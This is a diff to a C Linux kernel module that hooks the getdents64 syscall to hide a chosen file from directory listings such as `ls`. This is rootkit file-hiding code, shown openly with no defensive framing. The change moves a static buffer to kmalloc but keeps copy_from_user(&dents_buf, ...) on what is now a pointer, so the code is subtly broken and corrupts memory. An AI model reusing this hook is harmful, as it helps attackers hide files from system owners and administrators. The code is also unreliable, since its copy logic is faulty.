@@ -41,9 +41,6 @@ static asmlinkage long (*orig_getdents64_impl)(const struct pt_regs *);
 // calls are the only way for `ls` to access information about the directory
 // contents.
 
-enum { dents_buf_cap = 60000 };	// Big enough for most calls.
-static char dents_buf[dents_buf_cap];
-
 // This hook behaves like getdents64(2) but hides the file called `filename` from being shown.
 static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 {
@@ -61,14 +58,15 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 	if (n_read <= 0)
 		return n_read;
 
-	if (n_read > dents_buf_cap) {
-		pr_alert("Read more that can be copied into the buffer\n");
+	char *dents_buf = kmalloc(n_read, GFP_KERNEL);
+	if (dents_buf == NULL)
 		return n_read;
-	}
 
 	// Get a copy of the data from userspace for easy access.
-	if (copy_from_user(&dents_buf, dents, n_read))
-		return -1;
+	if (copy_from_user(&dents_buf, dents, n_read)) {
+		kfree(dents_buf);
+		return n_read;
+	}
 
 	// Iterate all directory entries. If an entry has the name of the file that should be hidden, it's deleted.
 	struct linux_dirent64 *d;
@@ -97,8 +95,12 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 	}
 
 	// Put the (potentially modified) directory entries back into user memory.
-	if (copy_to_user(dents, dents_buf, n_read))
-		return -1;
+	if (copy_to_user(dents, dents_buf, n_read)) {
+		kfree(dents_buf);
+		return n_read;
+	}
+
+	kfree(dents_buf);
 
 	return n_read;
 }
